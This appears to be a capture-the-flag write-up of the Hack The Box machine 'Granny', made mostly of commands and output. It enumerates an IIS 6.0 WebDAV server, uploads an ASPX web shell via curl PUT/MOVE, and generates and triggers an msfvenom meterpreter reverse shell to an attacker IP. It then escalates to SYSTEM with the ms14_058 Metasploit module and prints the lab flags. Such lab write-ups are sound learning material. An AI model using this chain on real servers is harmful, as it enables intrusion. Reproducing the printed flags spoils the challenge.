---
title: "Granny"
permalink: /Granny/
layout: single
author-profile: true
---
```
 ~  sudo nmap -T4 -A 10.10.10.15                                                  10s  Tue 14 Jun 2022 11:12:10 BST
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 11:12 BST
Nmap scan report for 10.10.10.15
Host is up (0.058s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Tue, 14 Jun 2022 10:12:36 GMT
|_  WebDAV type: Unknown
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
```

http-enum
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /_vti_log/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder
```

davtest
```
~  davtest -url http://10.10.10.15                                             113ms  Tue 14 Jun 2022 11:48:46 BST
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: 8285N4rn3GVfWN2
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2
********************************************************
 Sending test files
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.php
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.cfm
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.jsp
PUT	asp	FAIL
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.jhtml
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.txt
PUT	cgi	FAIL
PUT	shtml	FAIL
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.pl
PUT	aspx	FAIL
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.html
********************************************************
 Checking for test file execution
EXEC	php	FAIL
EXEC	cfm	FAIL
EXEC	jsp	FAIL
EXEC	jhtml	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.txt
EXEC	pl	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.html

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2
PUT File: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.php
PUT File: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.cfm
PUT File: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.jsp
PUT File: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.jhtml
PUT File: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.txt
PUT File: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.pl
PUT File: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.html
Executes: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.txt
Executes: http://10.10.10.15/DavTestDir_8285N4rn3GVfWN2/davtest_8285N4rn3GVfWN2.html
```

```
curl -X PUT 'http://10.10.10.15/cmdasp.txt' -d @cmdasp.aspx 

curl -X MOVE -H 'Destination:http://10.10.10.15/cmdasp.aspx' http://10.10.10.15/cmdasp.txt
```

this worked now we will load a reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx > met.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2855 bytes

~/D/HTB_Granny  ls                                                    
cmdasp.aspx  met.aspx  webdav_exploit/

~/D/HTB_Granny  curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx                  

~/D/HTB_Granny  curl -X MOVE -H 'Destination:http://10.10.10.15/mat.aspx' http://10.10.10.15/met.txt

~/D/HTB_Granny  curl http://10.10.10.15/mat.aspx   

```

now we have a reverse shell
```
msf5 exploit(multi/handler) > search local_exploit

Matching Modules
================

   Name                                      Disclosure Date  Rank    Check  Description
   ----                                      ---------------  ----    -----  -----------
   post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
```
```
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.14:4444
[*] Launching notepad to host the exploit...
[+] Process 2304 launched.
[*] Reflectively injecting the exploit DLL into 2304...
[*] Injecting exploit into 2304...
[*] Exploit injected. Injecting payload into 2304...
[*] Payload injected. Executing exploit...        
[*] Sending stage (179779 bytes) to 10.10.10.15
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 4 opened (10.10.14.14:4444 -> 10.10.10.15:1044) at 2019-03-06 17:20:47 -0500
   
meterpreter > getuid            
Server username: NT AUTHORITY\SYSTEM
```
navigate to user directories and get the flags

``user: '700c5dc163014e22b3e408f8703f67d1'``

``root: 'aa4beed1c0584445ab463a6747bd06e9'``
